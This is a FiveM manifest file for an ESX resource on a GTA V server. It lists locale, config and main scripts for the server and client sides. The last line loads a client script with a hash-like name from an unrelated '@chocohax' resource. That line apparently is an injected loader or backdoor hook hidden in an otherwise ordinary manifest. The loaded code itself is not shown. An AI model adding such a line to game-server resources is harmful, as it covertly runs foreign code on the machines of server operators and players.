fx_version 'adamant'

game 'gta5'

description 'ESX '

version '1.0'

server_scripts {
  '@es_extended/locale.lua',
  '@mysql-async/lib/MySQL.lua',
  'locales/br.lua',
  'locales/de.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/es.lua',
  'config.lua',
  'server/main.lua'
}

client_scripts {
  '@es_extended/locale.lua',
  'locales/br.lua',
  'locales/de.lua',
  'locales/en.lua',
  'locales/fr.lua',
  'locales/es.lua',
  'config.lua',
  'client/main.lua'
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'